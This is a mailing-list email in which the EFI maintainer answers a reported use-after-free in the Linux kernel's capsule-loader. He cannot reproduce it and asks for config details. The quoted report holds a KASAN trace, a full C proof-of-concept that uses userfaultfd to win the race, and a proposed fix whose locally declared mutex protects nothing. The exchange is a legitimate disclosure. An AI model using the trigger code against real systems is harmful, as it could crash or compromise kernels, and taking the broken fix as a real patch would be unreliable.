Return-Path: <linux-efi-owner@vger.kernel.org>
X-Original-To: lists+linux-efi@lfdr.de
Delivered-To: lists+linux-efi@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id D5EE866CF93
	for <lists+linux-efi@lfdr.de>; Mon, 16 Jan 2023 20:34:38 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S232697AbjAPTeh (ORCPT <rfc822;lists+linux-efi@lfdr.de>);
        Mon, 16 Jan 2023 14:34:37 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:46914 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S232671AbjAPTeg (ORCPT
        <rfc822;linux-efi@vger.kernel.org>); Mon, 16 Jan 2023 14:34:36 -0500
Received: from dfw.source.kernel.org (dfw.source.kernel.org [139.178.84.217])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id EA1F5222CC
        for <linux-efi@vger.kernel.org>; Mon, 16 Jan 2023 11:34:35 -0800 (PST)
Received: from smtp.kernel.org (relay.kernel.org [52.25.139.140])
        (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
        (No client certificate requested)
        by dfw.source.kernel.org (Postfix) with ESMTPS id 9013660F5F
        for <linux-efi@vger.kernel.org>; Mon, 16 Jan 2023 19:34:35 +0000 (UTC)
Received: by smtp.kernel.org (Postfix) with ESMTPSA id E99C8C433F0
        for <linux-efi@vger.kernel.org>; Mon, 16 Jan 2023 19:34:34 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
        s=k20201202; t=1673897674;
        bh=LiyeXMYVP2lC9DdxiMWVqalU49MUoecqOlQpE/jk424=;
        h=References:In-Reply-To:From:Date:Subject:To:From;
        b=pq5Bz5eH4nFJGEqBKnewDQBwp9Cm7KK+4JIP3gEDKy+G5XLL/dRYS8EJ3ed7OLP4V
         Lbd7Eo5zoi1pWgfnKHJTGDQ2LD+0qtNlBAXjdqsM9zTkjSDErTHyq2C9rZjQ03iTTY
         dOfslzS1KwAnQvd38hZqUasKlLPl5yXFbJCrdkyqJp70L0l3pFkN4Dof3Tcp74uwCI
         QL04e2VKBU2a5K82It5w5jnIKJjCW3IfyAaaPqLJGvDZvAAvx2ugYkmhrzz0wcYs3F
         cJ9QESM8jmTys9sf1KPXM46lAXzBWqajq7xxstzEBuY4LJRONMoTdoN9sYKS3Zqjx/
         Ez13fhnKpXc9Q==
Received: by mail-lj1-f177.google.com with SMTP id f20so31017794lja.4
        for <linux-efi@vger.kernel.org>; Mon, 16 Jan 2023 11:34:34 -0800 (PST)
X-Gm-Message-State: AFqh2kq2VeZtiVjO8DEmQadBfGll+VizdUNVa0kWURcmIj3uaVOIJykV
        HroIqhrFnaNQHD+5AsJ97UFh76LpZg87nBdirjM=
X-Google-Smtp-Source: AMrXdXsaq1kvIqDUKYQMeek/MseiWLSFvBOtDVps7FNG/rkSkcxBs/AkaLfFDL2j1+YhyL4zfpJdGpt6O1tXfpLhDf8=
X-Received: by 2002:a2e:9449:0:b0:28b:9755:77a with SMTP id
 o9-20020a2e9449000000b0028b9755077amr88667ljh.152.1673897672917; Mon, 16 Jan
 2023 11:34:32 -0800 (PST)
MIME-Version: 1.0
References: <TYCP286MB146543EE0EAA041D2A4FA262AA079@TYCP286MB1465.JPNP286.PROD.OUTLOOK.COM>
In-Reply-To: <TYCP286MB146543EE0EAA041D2A4FA262AA079@TYCP286MB1465.JPNP286.PROD.OUTLOOK.COM>
From:   Ard Biesheuvel <ardb@kernel.org>
Date:   Mon, 16 Jan 2023 20:34:21 +0100
X-Gmail-Original-Message-ID: <CAMj1kXEmBh+=jnnwprqVHkBiW8heOZsVzx60PupdY44m_CB5PQ@mail.gmail.com>
Message-ID: <CAMj1kXEmBh+=jnnwprqVHkBiW8heOZsVzx60PupdY44m_CB5PQ@mail.gmail.com>
Subject: Re: Report Use-After-Free in capsule-loader.c
To:     =?UTF-8?B?6buEIOaZkw==?= <NigelXiao@outlook.com>,
        linux-efi <linux-efi@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Spam-Status: No, score=-7.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_HI,
        SPF_HELO_NONE,SPF_PASS autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-efi.vger.kernel.org>
X-Mailing-List: linux-efi@vger.kernel.org

On Wed, 16 Nov 2022 at 08:18, =E9=BB=84 =E6=99=93 <NigelXiao@outlook.com> w=
rote:
>
> Hello Ard Biesheuvel,
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82I found a bug in ca=
psule-loader.c,Testing also exists in Linux 6.1.Hope to get your feedback, =
thank you
>
> The reason for the vulnerability is that struct capsule_info *cap_info is=
 used in efi_capsule_write is constant which comes from file->private_data.=
 If efi_capsule_release is called before the copy_from_user function, use-a=
fter-free is triggered
>
> cpu1=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=
=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=
=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82cpu2
> efi_capsule_write
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82cap_info =3D=E2=80=82file->p=
rivate_data
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=
=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82efi_capsule_release
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=
=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82cap_info =3D fi=
le->private_data
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=
=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=
=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=
=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=
=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82efi_free_all_buff_pages
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82copy_from_use
>
>

Thanks for the report.

I cannot reproduce this using your C program, neither on x86 nor on arm64

Can you share the config options you enabled to get this behavior?


> Output of Oops:
> [  119.429759] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [  119.430192] BUG: KASAN: use-after-free in efi_capsule_setup_info+0x1c/=
0x40
> [  119.430650] Read of size 28 at addr ffff888006061000 by task test/139
> [  119.430836]
> [  119.431060] CPU: 0 PID: 139 Comm: test Not tainted 5.19.0 #8
> [  119.431296] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIO=
S 1.13.0-1ubuntu1.1 04/01/4
> [  119.431641] Call Trace:
> [  119.431777]  <TASK>
> [  119.431917]  dump_stack_lvl+0x34/0x48
> [  119.432103]  print_report.cold+0xb2/0x6bb
> [  119.432267]  ? exc_page_fault+0x57/0xc0
> [  119.432957]  ? efi_capsule_setup_info+0x1c/0x40
> [  119.433289]  kasan_report+0xa9/0x120
> [  119.433428]  ? efi_capsule_setup_info+0x1c/0x40
> [  119.433563]  kasan_check_range+0x155/0x1f0
> [  119.433704]  memcpy+0x20/0x60
> [  119.433820]  efi_capsule_setup_info+0x1c/0x40
> [  119.433955]  efi_capsule_write+0x29d/0x3a0
> [  119.434104]  vfs_write+0xfe/0x3e0
> [  119.434227]  ksys_write+0xb4/0x150
> [  119.434354]  ? __ia32_sys_read+0x40/0x40
> [  119.434498]  ? filp_open+0x50/0x50
> [  119.434634]  ? fpregs_assert_state_consistent+0x58/0x70
> [  119.434794]  ? exit_to_user_mode_prepare+0x36/0x130
> [  119.434940]  do_syscall_64+0x3b/0x90
> [  119.435069]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
> [  119.435292] RIP: 0033:0x406f8f
> [  119.435536] Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 99 fd ff f=
f 48 8b 54 24 18 48 8b 74 8
> [  119.436034] RSP: 002b:00007ffc6f88f5e0 EFLAGS: 00000293 ORIG_RAX: 0000=
000000000001
> [  119.436265] RAX: ffffffffffffffda RBX: 00000000004004c0 RCX: 000000000=
0406f8f
> [  119.436646] RDX: 0000000000001000 RSI: 00007f3bc6213000 RDI: 000000000=
0000004
> [  119.436855] RBP: 00007ffc6f8906c0 R08: 0000000000000000 R09: 00007f3bc=
6212700
> [  119.437221] R10: 0000000000000000 R11: 0000000000000293 R12: 000000000=
04095e0
> [  119.437566] R13: 0000000000000000 R14: 00000000004e0018 R15: 000000000=
0000000
> [  119.437802]  </TASK>
> [  119.437919]
> [  119.438038] Allocated by task 0:
> [  119.438174] (stack is not available)
> [  119.438270]
> [  119.438352] Freed by task 0:
> [  119.438477] (stack is not available)
> [  119.438571]
> [  119.438655] The buggy address belongs to the object at ffff88800606100=
0
> [  119.438655]  which belongs to the cache kmalloc-16 of size 16
> [  119.439018] The buggy address is located 0 bytes inside of
> [  119.439018]  16-byte region [ffff888006061000, ffff888006061010)
> [  119.439325]
> [  119.439443] The buggy address belongs to the physical page:
> [  119.439683] page:(____ptrval____) refcount:1 mapcount:0 mapping:000000=
0000000000 index:0x0 pfn:01
> [  119.440029] flags: 0x100000000000200(slab|node=3D0|zone=3D1)
> [  119.440554] raw: 0100000000000200 0000000000000000 dead000000000122 ff=
ff888004c423c0
> [  119.440816] raw: 0000000000000000 0000000080800080 00000001ffffffff 00=
00000000000000
> [  119.441046] page dumped because: kasan: bad access detected
> [  119.441272]
> [  119.441429] Memory state around the buggy address:
> [  119.441789]  ffff888006060f00: ff ff ff ff ff ff ff ff ff ff ff ff ff =
ff ff ff
> [  119.441990]  ffff888006060f80: ff ff ff ff ff ff ff ff ff ff ff ff ff =
ff ff ff
> [  119.442184] >ffff888006061000: fa fb fc fc fa fb fc fc fa fb fc fc fa =
fb fc fc
> [  119.442377]                    ^
> [  119.442514]  ffff888006061080: fa fb fc fc fa fb fc fc fa fb fc fc fa =
fb fc fc
> [  119.442721]  ffff888006061100: fa fb fc fc fa fb fc fc fa fb fc fc fa =
fb fc fc
> [  119.442898] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [  119.443279] Disabling lock debugging due to kernel taint
>
>
> poc
> '''
> #include  <inttypes.h>
> #include <stdlib.h>
> #include <stdio.h>
> #include <stdint.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <sys/ioctl.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <unistd.h>
> #include <error.h>
> #include <string.h>
> #include <linux/userfaultfd.h>
> #include <pthread.h>
> #include <signal.h>
> #include <stdbool.h>
> #include <poll.h>
> #include <sys/mman.h>
> #include <sys/syscall.h>
> #include <sys/ipc.h>
> #include <sys/time.h>
> #include <sys/param.h>
> #include <sys/resource.h>
> #include <sys/msg.h>
> #include <linux/vhost.h>
> #include <err.h>
>
> static int fd;
> char fault_buffer[0x1000];
> void* fault_handler(void* arg){
>
>
>     struct uffd_msg msg;
>     unsigned long uffd =3D (unsigned long)arg;
>     puts("[+] fault_handler creaete");
>     sleep(3);
>     struct pollfd pollfd;
>     int nready;
>     pollfd.fd =3D uffd;
>     pollfd.events =3D POLLIN;
>
>     nready =3D poll(&pollfd,1,-1);
>     if(nready !=3D 1)
>         err(1,"poll");
>
>     printf("[+] Trigger\n");
>
>     close(fd);
>
>     nready =3D read(uffd,&msg,sizeof(msg));
>
>     if(nready <=3D 0)
>         err(1,"msg error!!");
>
>     memset(fault_buffer,'a',0x100);
>
>    struct uffdio_copy uc;
>    uc.src =3D (unsigned long)fault_buffer;
>    uc.dst =3D (unsigned long)msg.arg.pagefault.address & ~(0x1000 - 1);;
>    uc.len =3D 0x1000;
>    uc.mode =3D 0;
>    uc.copy =3D 0;
>    ioctl(uffd, UFFDIO_COPY, &uc);
>    puts("[+] writek_handler done!!");
>
> }
>
>
> void RegisterUserfault(void* fault_page){
>
>     pthread_t thr;
>     struct uffdio_api ua;
>     struct uffdio_register ur;
>     uint64_t uffd =3D syscall(__NR_userfaultfd,O_CLOEXEC | O_NONBLOCK);
>     ua.api =3D UFFD_API;
>     ua.features =3D 0;
>     if(ioctl(uffd,UFFDIO_API,&ua)=3D=3D -1)
>         err(1,"ioctl-UFFDIO_API");
>
>     ur.range.start =3D (unsigned long)fault_page;
>     ur.range.len =3D 0x1000;
>     ur.mode =3D UFFDIO_REGISTER_MODE_MISSING;
>     if(ioctl(uffd,UFFDIO_REGISTER,&ur) =3D=3D -1)
>         err(1,"ioctl-UFFDIO_REGISTER");
>
>     if(pthread_create(&thr,NULL,fault_handler,(void*)uffd)!=3D0)
>         err(1,"pthread_create");
>
>
> }
>
>
> int main(int args,char* argv){
>
>     char *user_buf =3D mmap(NULL,0x1000,PROT_READ | PROT_WRITE,MAP_PRIVAT=
E | MAP_ANONYMOUS,-1,0);
>     if (user_buf =3D=3D MAP_FAILED)
>     {
>         err(1,"mmap");
>     }
>     RegisterUserfault(user_buf);
>
>     fd =3D open("/dev/efi_capsule_loader",O_RDWR);
>     if(fd < 0){
>         perror("open fail");
>     }
>     write(fd,user_buf,0x1000);
>
> }
>
>
> '''
>
>
> fix:
>
> '''
>
> static int efi_capsule_release(struct inode *inode, struct file *file)
> {
>    struct mutex chrd;
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82 ...
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82mutex_lock(&chrd);
> =E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82=E2=80=82...
>
>     mutex_unlock(&chrd);
> =E2=80=82}
>
> '''
>
> Thank
>
>
